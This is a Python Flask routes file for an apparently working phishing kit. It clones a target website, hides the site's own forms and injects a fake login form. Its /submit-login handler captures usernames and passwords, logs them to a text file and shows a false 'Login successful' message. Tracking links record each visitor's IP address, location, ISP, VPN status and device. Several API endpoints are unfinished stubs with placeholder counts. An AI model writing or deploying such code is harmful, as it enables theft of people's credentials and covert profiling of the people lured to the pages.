import uuid
from flask import Blueprint, request, redirect, render_template, Response, send_from_directory
from models import save_link, get_link, save_click
from user_agents import parse
import requests
from datetime import datetime, timezone
import base64
import re
from urllib.parse import urljoin
import os
import shutil
from bs4 import BeautifulSoup
from browser_clone import render_and_save

main = Blueprint('main', __name__)

def get_ip_info(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/')
        print(f"[DEBUG] IP: {ip} | ipapi.co response: {resp.text}")
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        print(f"[DEBUG] Exception in get_ip_info: {e}")
    return {}

@main.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        target_url = request.form.get('target_url')
        if not target_url:
            return render_template('index.html', error='Target URL required')
        # Auto-prepend http:// if missing
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        clone_id = str(uuid.uuid4())
        clone_dir = os.path.join(os.path.dirname(__file__), 'clones', clone_id)
        os.makedirs(clone_dir, exist_ok=True)
        try:
            html_path, screenshot_path = render_and_save(target_url, clone_dir)
        except Exception as e:
            return render_template('index.html', error=f'Failed to render with browser: {e}')
        return render_template('index.html', generated_link=f'/clones/{clone_id}/index.html', screenshot_link=f'/clones/{clone_id}/screenshot.png')
    return render_template('index.html')

@main.route('/track/<link_uuid>')
def track_and_redirect(link_uuid):
    link = get_link(link_uuid)
    if not link:
        return 'Invalid link', 404
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua_string = request.headers.get('User-Agent', '')
    ip_info = get_ip_info(ip)
    ua = parse(ua_string)
    click_data = {
        'link_uuid': link_uuid,
        'ip_address': ip,
        'country': ip_info.get('country_name'),
        'city': ip_info.get('city'),
        'isp': ip_info.get('org'),
        'vpn': ip_info.get('privacy', {}).get('vpn', False) if ip_info.get('privacy') else False,
        'device_type': 'mobile' if ua.is_mobile else 'tablet' if ua.is_tablet else 'pc' if ua.is_pc else 'other',
        'os': ua.os.family,
        'browser': ua.browser.family,
        'browser_version': ua.browser.version_string,
        'user_agent': ua_string
    }
    save_click(click_data)
    return redirect(link['target_url'], code=302)

@main.route('/clone/<encoded_url>', methods=['GET'])
def clone_page(encoded_url):
    try:
        url = base64.urlsafe_b64decode(encoded_url.encode()).decode()
    except Exception:
        return 'Invalid URL encoding', 400
    try:
        resp = requests.get(url, timeout=5)
        html = resp.text
    except Exception as e:
        return f'Failed to fetch target: {e}', 502

    # Rewrite relative paths to absolute
    def absolutize(match):
        attr, path = match.groups()
        if path.startswith(('http://', 'https://', 'data:', 'javascript:')):
            return match.group(0)
        return f'{attr}="{urljoin(url, path)}"'
    html = re.sub(r'(src|href)="([^"]+)"', absolutize, html)

    # Inject dummy login form and JS to ensure only it is visible
    inject = '''
    <style>
    form:not(#dummy-login-form) { display: none !important; }
    #dummy-login-form {
        display: block !important;
        background: #23272a;
        color: #e0e0e0;
        padding: 24px;
        border-radius: 10px;
        margin: 40px auto;
        max-width: 350px;
        box-shadow: 0 2px 16px #000a;
        z-index: 9999;
        position: relative;
    }
    #dummy-login-form input, #dummy-login-form button {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border-radius: 5px;
        border: none;
        font-size: 1rem;
    }
    #dummy-login-form button {
        background: #7289da;
        color: #fff;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    #dummy-login-form button:hover { background: #5b6eae; }
    </style>
    <form id="dummy-login-form" method="POST" action="/submit-login">
        <input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password">
        <input type="hidden" name="redirect_url" value="''' + url + '''">
        <button type="submit">Login</button>
    </form>
    <script>
    window.addEventListener('DOMContentLoaded', function() {
        var forms = document.querySelectorAll('form');
        forms.forEach(function(f) {
            if (f.id !== 'dummy-login-form') f.remove();
        });
        var dummy = document.getElementById('dummy-login-form');
        if (dummy) {
            document.body.appendChild(dummy);
            dummy.scrollIntoView({behavior:'smooth'});
            dummy.querySelector('input').focus();
        }
    });
    </script>
    '''
    if '</body>' in html:
        html = html.replace('</body>', inject + '</body>')
    else:
        html += inject
    return Response(html, content_type="text/html")

@main.route('/submit-login', methods=['POST'])
def submit_login():
    username = request.form.get('username')
    password = request.form.get('password')
    redirect_url = request.form.get('redirect_url', 'https://www.google.com')
    if not redirect_url.startswith(('http://', 'https://')):
        redirect_url = 'http://' + redirect_url
    print(f"[DEBUG] Received credentials: {username}:{password}")
    # Store dummy credentials
    try:
        with open('dummy_creds.txt', 'a', encoding='utf-8') as f:
            if username or password:
                f.write(f'{username}:{password}\n')
        print("[DEBUG] Credentials written to dummy_creds.txt")
    except Exception as e:
        print(f"[DEBUG] Failed to write credentials: {e}")
    # Show a message before redirecting
    return f'''<html><head><meta http-equiv="refresh" content="2;url={redirect_url}"></head><body style="background:#181a1b;color:#e0e0e0;font-family:sans-serif;text-align:center;padding-top:80px;"><h2>Login successful!</h2><p>Redirecting you to the original site...</p></body></html>'''

def clone_website(target_url, clone_id):
    clone_dir = os.path.join(os.path.dirname(__file__), 'clones', clone_id)
    if os.path.exists(clone_dir):
        shutil.rmtree(clone_dir)
    os.makedirs(clone_dir, exist_ok=True)
    try:
        resp = requests.get(target_url, timeout=10)
        html = resp.text
    except Exception as e:
        return None, f'Failed to fetch target: {e}'
    soup = BeautifulSoup(html, 'html.parser')
    # Download and rewrite resources
    for tag, attr in [('img', 'src'), ('link', 'href'), ('script', 'src')]:
        for el in soup.find_all(tag):
            url = el.get(attr)
            if url and not url.startswith(('http://', 'https://', 'data:', 'javascript:')):
                url = requests.compat.urljoin(target_url, url)
            if url and url.startswith(('http://', 'https://')):
                filename = os.path.basename(url.split('?')[0])
                local_path = os.path.join(clone_dir, filename)
                try:
                    r = requests.get(url, timeout=5)
                    with open(local_path, 'wb') as f:
                        f.write(r.content)
                    el[attr] = f'/clones/{clone_id}/{filename}'
                except Exception:
                    continue
    # Save rewritten HTML
    html_path = os.path.join(clone_dir, 'index.html')
    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(str(soup))
    return clone_id, None

@main.route('/clones/<clone_id>/<path:filename>')
def serve_clone_file(clone_id, filename):
    clone_dir = os.path.join(os.path.dirname(__file__), 'clones', clone_id)
    return send_from_directory(clone_dir, filename)

@main.route('/api/links', methods=['POST'])
def api_save_link():
    data = request.get_json()
    target_url = data.get('target_url')
    if not target_url:
        return {'error': 'Target URL is required'}, 400
    # Auto-prepend http:// if missing
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    link_uuid = str(uuid.uuid4())
    save_link(link_uuid, target_url)
    return {'link_uuid': link_uuid, 'target_url': target_url}, 201

@main.route('/api/track/<link_uuid>', methods=['GET'])
def api_track_link(link_uuid):
    link = get_link(link_uuid)
    if not link:
        return {'error': 'Link not found'}, 404
    return {'link_uuid': link_uuid, 'target_url': link['target_url']}, 200

@main.route('/api/clicks', methods=['GET'])
def api_get_clicks():
    # For simplicity, return all clicks (consider pagination in real use cases)
    all_clicks = get_all_clicks()
    return {'clicks': all_clicks}, 200

@main.route('/api/stats/<link_uuid>', methods=['GET'])
def api_get_stats(link_uuid):
    link = get_link(link_uuid)
    if not link:
        return {'error': 'Link not found'}, 404
    # Here you would gather and return real statistics
    stats = {
        'link_uuid': link_uuid,
        'total_clicks': 42,  # Placeholder
        'unique_clicks': 24,  # Placeholder
        'click_details': []  # Placeholder for detailed click info
    }
    return {'stats': stats}, 200

@main.route('/api/delete_link/<link_uuid>', methods=['DELETE'])
def api_delete_link(link_uuid):
    # Implement link deletion logic
    return {'message': 'Link deleted'}, 200

@main.route('/api/delete_all_links', methods=['DELETE'])
def api_delete_all_links():
    # Implement logic to delete all links
    return {'message': 'All links deleted'}, 200

@main.route('/api/export_links', methods=['GET'])
def api_export_links():
    # Implement logic to export links (e.g., to a CSV file)
    return {'message': 'Links exported'}, 200

@main.route('/api/import_links', methods=['POST'])
def api_import_links():
    # Implement logic to import links from a file
    return {'message': 'Links imported'}, 200

@main.route('/api/render_website', methods=['POST'])
def api_render_website():
    data = request.get_json()
    target_url = data.get('target_url')
    if not target_url:
        return {'error': 'Target URL is required'}, 400
    # Auto-prepend http:// if missing
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    clone_id = str(uuid.uuid4())
    clone_dir = os.path.join(os.path.dirname(__file__), 'clones', clone_id)
    os.makedirs(clone_dir, exist_ok=True)
    html_path = os.path.join(clone_dir, 'index.html')
    try:
        render_and_save(target_url, html_path)
    except Exception as e:
        return {'error': f'Failed to render website: {e}'}, 500
    return {'message': 'Website rendered', 'clone_id': clone_id}, 200

@main.route('/api/health', methods=['GET'])
def api_health_check():
    return {'status': 'ok'}, 200